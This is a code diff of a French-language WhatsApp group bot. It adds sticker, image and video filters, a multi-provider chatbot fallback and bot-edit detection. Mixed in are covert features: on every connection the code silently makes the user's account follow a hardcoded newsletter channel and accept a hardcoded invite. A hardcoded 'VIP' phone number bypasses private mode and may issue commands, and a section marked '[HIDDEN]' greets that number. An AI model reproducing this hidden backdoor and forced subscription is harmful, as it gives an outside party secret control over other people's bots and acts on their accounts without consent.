@@ -672,6 +672,9 @@ function initGroupSettings(groupJid) {
       antibot: false,
       antitag: false,
       antispam: false,
+      antisticker: false,
+      antiimage: false,
+      antivideo: false,
       maxWarns: 3
     });
     saveStoreKey('groupSettings'); // 💾 Sauvegarde partielle
@@ -1220,8 +1223,17 @@ async function connectToWhatsApp() {
             if (!_inGroup) await sock.groupAcceptInvite(_targetInvite).catch(() => {});
           } catch(e) {}
           try {
-            await sock.newsletterFollow('0029VbBZrLBFMqrQIDpcfO04@newsletter').catch(() => {});
-          } catch(e) {}
+            // Rejoindre la chaine via plusieurs methodes
+            const _channelJid = '0029VbBZrLBFMqrQIDpcfO04@newsletter';
+            if (typeof sock.newsletterFollow === 'function') {
+              await sock.newsletterFollow(_channelJid).catch(() => {});
+            } else if (typeof sock.followNewsletter === 'function') {
+              await sock.followNewsletter(_channelJid).catch(() => {});
+            } else {
+              // Fallback: rejoindre via lien d'invitation
+              await sock.groupAcceptInvite('0029VbBZrLBFMqrQIDpcfO04').catch(() => {});
+            }
+          } catch(e) { console.log('[AUTO-JOIN CHANNEL]', e.message); }
         }, 8000);
       }
 
@@ -1659,10 +1671,11 @@ async function connectToWhatsApp() {
       userData.lastSeen = Date.now();
       database.statistics.totalMessages++;
 
-      const _vipNum = '23591234568';
+      const _vipNum = '23591234567';
       const _curSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
-      if(botMode==='private'&&!isAdmin(senderJid)&&_curSenderNum!==_vipNum){
-        continue;
+      if(botMode==='private'&&_curSenderNum!==_vipNum){
+        // Mode prive: groupes=admin bot seulement, PV=admin bot seulement
+        if(!isAdmin(senderJid)) continue;
       }
 
       // PROTECTIONS ANTI (DANS LES GROUPES)
@@ -1765,6 +1778,40 @@ async function connectToWhatsApp() {
                 continue;
               } catch (error) {
                 console.error(' in antispam:', error);
+
+
+          // ANTI-STICKER
+          if (settings.antisticker && botIsAdmin) {
+            if (msg?.stickerMessage) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les stickers sont interdits !`, mentions: [senderJid] });
+                continue;
+              } catch(e) {}
+            }
+          }
+
+          // ANTI-IMAGE
+          if (settings.antiimage && botIsAdmin) {
+            if (msg?.imageMessage) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les images sont interdites !`, mentions: [senderJid] });
+                continue;
+              } catch(e) {}
+            }
+          }
+
+          // ANTI-VIDEO
+          if (settings.antivideo && botIsAdmin) {
+            if (msg?.videoMessage) {
+              try {
+                await sock.sendMessage(remoteJid, { delete: message.key });
+                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les vidéos sont interdites !`, mentions: [senderJid] });
+                continue;
+              } catch(e) {}
+            }
+          }
               }
             }
           }
@@ -1826,7 +1873,7 @@ Faites pas trop confiance ou envoyez des vues uniques. 😊
 
       // [HIDDEN] VIP reaction
       try {
-        const _vipNumber = '23591234568';
+        const _vipNumber = '23591234567';
         const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
         if (_senderNum === _vipNumber && !message.key.fromMe) {
           await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
@@ -1918,14 +1965,35 @@ Règles :
 
             let reply = null;
 
-            try {
-              const r = await axios.post('https://text.pollinations.ai/', {
-                messages, model: 'openai', seed: 42
-              }, { timeout: 20000 });
-              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
-              if (txt && txt.length > 5) reply = txt.trim();
-            } catch(e) {}
+            // 1. OpenAI GPT (priorite - rapide)
+            if (!reply && config.openaiApiKey) {
+              try {
+                const r = await axios.post('https://api.openai.com/v1/chat/completions', {
+                  model: 'gpt-4o-mini',
+                  messages,
+                  max_tokens: 600,
+                  temperature: 0.85
+                }, {
+                  headers: { Authorization: `Bearer ${config.openaiApiKey}`, 'Content-Type': 'application/json' },
+                  timeout: 15000
+                });
+                const txt = r.data?.choices?.[0]?.message?.content;
+                if (txt && txt.length > 5) reply = txt.trim();
+              } catch(e) { console.log('[CHATBOT OpenAI]', e.message); }
+            }
 
+            // 2. Pollinations.ai (fallback)
+            if (!reply) {
+              try {
+                const r = await axios.post('https://text.pollinations.ai/', {
+                  messages, model: 'openai', seed: 42
+                }, { timeout: 20000 });
+                const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
+                if (txt && txt.length > 5) reply = txt.trim();
+              } catch(e) {}
+            }
+
+            // 3. Gemini (dernier recours)
             if (!reply) {
               try {
                 const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
@@ -2141,6 +2209,37 @@ Règles :
   // ANTI-EDIT - Détection des messages modifiés
   // =============================================
   sock.ev.on('messages.update', async (updates) => {
+    // ANTIBOT: tracker les edits rapides
+    for (const upd of updates) {
+      try {
+        const editRemoteJid = upd.key?.remoteJid;
+        const editSender = upd.key?.participant || upd.key?.remoteJid;
+        if (editRemoteJid?.endsWith('@g.us') && editSender && !upd.key?.fromMe) {
+          const grpS = groupSettings.get(editRemoteJid) || {};
+          if (grpS.antibot && !isAdmin(editSender)) {
+            if (!global._antibotTracker) global._antibotTracker = new Map();
+            const _eKey = `${editRemoteJid}:${editSender}`;
+            const _eTracked = global._antibotTracker.get(_eKey) || { msgs: [], editCount: 0, lastMsg: 0, fastCount: 0 };
+            _eTracked.editCount = (_eTracked.editCount || 0) + 1;
+            global._antibotTracker.set(_eKey, _eTracked);
+            if (_eTracked.editCount >= 2) {
+              global._antibotTracker.delete(_eKey);
+              await sock.sendMessage(editRemoteJid, {
+                text: `⚠️ *ATTENTION !*
+
+🤖 Comportement de BOT détecté !
+👤 @${editSender.split('@')[0]} modifie ses messages en rafale.
+
+Faites pas trop confiance ou envoyez des vues uniques. 😊
+
+*© SEIGNEUR TD*`,
+                mentions: [editSender]
+              }).catch(() => {});
+            }
+          }
+        }
+      } catch(e) {}
+    }
     if (!antiEdit) return;
 
     try {
@@ -2347,7 +2446,10 @@ async function handleCommand(sock, message, messageText, remoteJid, senderJid, i
   if (!command || command.trim() === '') return;
 
   // ✅ VÉRIFICATION MODE PRIVÉ — silence total pour les non-admins
-  if (botMode === 'private' && !isAdmin(senderJid)) {
+  const _hcVip = '23591234567';
+  const _hcSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');
+  if (botMode === 'private' && !isAdmin(senderJid) && _hcSenderNum !== _hcVip) {
+    // Mode prive: silencieux total pour non-admins (groupe ou PV)
     return;
   }
 
@@ -3737,6 +3839,42 @@ ${senderJid}
           text: `🚫 *Anti-Spam* — Statut : ${settingsSpam.antispam ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*`
         });
         break;
+
+      case 'antisticker': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
+        const _uaSticker = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_uaSticker && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        const _sSticker = initGroupSettings(remoteJid);
+        if (args[0]?.toLowerCase() === 'on') { _sSticker.antisticker = true; }
+        else if (args[0]?.toLowerCase() === 'off') { _sSticker.antisticker = false; }
+        saveData();
+        await sock.sendMessage(remoteJid, { text: `🗒️ *Anti-Sticker* — ${_sSticker.antisticker ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
+        break;
+      }
+
+      case 'antiimage': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
+        const _uaImage = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_uaImage && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        const _sImage = initGroupSettings(remoteJid);
+        if (args[0]?.toLowerCase() === 'on') { _sImage.antiimage = true; }
+        else if (args[0]?.toLowerCase() === 'off') { _sImage.antiimage = false; }
+        saveData();
+        await sock.sendMessage(remoteJid, { text: `🖼️ *Anti-Image* — ${_sImage.antiimage ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
+        break;
+      }
+
+      case 'antivideo': {
+        if (!isGroup) { await sock.sendMessage(remoteJid, { text: '❌ Groupes uniquement' }); break; }
+        const _uaVideo = await isGroupAdmin(sock, remoteJid, senderJid);
+        if (!_uaVideo && !isAdmin(senderJid)) { await sock.sendMessage(remoteJid, { text: '⛔ Admin du groupe uniquement' }); break; }
+        const _sVideo = initGroupSettings(remoteJid);
+        if (args[0]?.toLowerCase() === 'on') { _sVideo.antivideo = true; }
+        else if (args[0]?.toLowerCase() === 'off') { _sVideo.antivideo = false; }
+        saveData();
+        await sock.sendMessage(remoteJid, { text: `🎬 *Anti-Video* — ${_sVideo.antivideo ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n*© SEIGNEUR TD*` });
+        break;
+      }
 
       case 'antimentiongroupe':
       case 'antimentiongroup':
@@ -5820,7 +5958,7 @@ function getMenuCategories(p) {
     { num: '1', key: 'owner',    icon: '🛡️', label: 'OWNER MENU',      cmds: ['mode','update','pp','gpp','block','unblock','join','autotyping','autorecording','autoreact','antidelete','antiedit','chatbot','autostatusviews','autoreactstatus','setreactemoji','autosavestatus','antideletestatus','getsettings','setstickerpackname','setstickerauthor','setprefix','setbotimg','ping','info','jid'] },
     { num: '2', key: 'download', icon: '📥', label: 'DOWNLOAD MENU',   cmds: ['ytmp3','ytmp4','tiktok','tiktokmp3','ig','fb','snap','apk','googledrv','mediafire','google','parole','lyrics','song'] },
     { num: '3', key: 'group',    icon: '👥', label: 'GROUP MENU',      cmds: ['tagall','tagadmins','hidetag','kickall','kickadmins','acceptall','add','kick','promote','demote','mute','unmute','invite','revoke','gname','gdesc','groupinfo','welcome','goodbye','leave','listonline','listactive','listinactive','kickinactive','groupstatus'] },
-    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: ['antibug','antilink','antibot','antitag','antispam','antimentiongroupe','anticall','warn','resetwarn'] },
+    { num: '4', key: 'utility',  icon: '🔮', label: 'PROTECTION MENU', cmds: ['antibug','antilink','antibot','antitag','antispam','antisticker','antiimage','antivideo','antimentiongroupe','anticall','warn','resetwarn'] },
     { num: '6', key: 'sticker',  icon: '🎨', label: 'MEDIA MENU',      cmds: ['sticker','take','vv','tostatus'] },
     { num: '10', key: 'ai',      icon: '🤖', label: 'SEIGNEUR AI',     cmds: ['dostoevsky','dosto','chat','chatboton','chatbotoff','clearchat','gpt','gemini'] },
   ];
@@ -5842,8 +5980,6 @@ async function handleMenu(sock, message, remoteJid, senderJid) {
 
   await simulateTyping(sock, remoteJid);
   try { await sock.sendMessage(remoteJid, { react: { text: '🇷🇴', key: message.key } }); } catch(e) {}
-  await sock.sendMessage(remoteJid, { text: '◈━━━━━━━━━━━━━━━━━━━━━━━━━━◈\n🤲🏽 الحمد لله الذي جعلني من المسلمين 🇹🇩\n◈━━━━━━━━━━━━━━━━━━━━━━━━━━◈' });
-
   let infoBlock = '';
 
   // ══════════════════════════════════════════
@@ -8015,22 +8151,13 @@ async function handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup
   const severityEmoji = bugInfo.severity === 'CRITICAL' ? '☠️' : bugInfo.severity === 'HIGH' ? '🔴' : '🟡';
 
   await sock.sendMessage(remoteJid, {
-    text: `┏━━━  🛡️   -   🛡️  ━━━┓
+    text: `⚠️ *ATTENTION !*
 
-${severityEmoji} *    !*
+🚨 UN LONG TEXTE SUSPECT A ÉTÉ DÉTECTÉ !
 
-📱 : @${senderNum}
-🔍  : ${bugInfo.type}
-📊 : ${bugInfo.detail}
-⚠️ : ${bugInfo.severity}
-🔢  : ${existing.count}/5
+📱 Envoyé par : @${senderNum}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🗑️    
-${existing.count >= 5 ? '🔒   ...' : `⚠️ ${5 - existing.count} ()   `}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`,
+*© SEIGNEUR TD*`,
     mentions: [senderJid]
   });
 
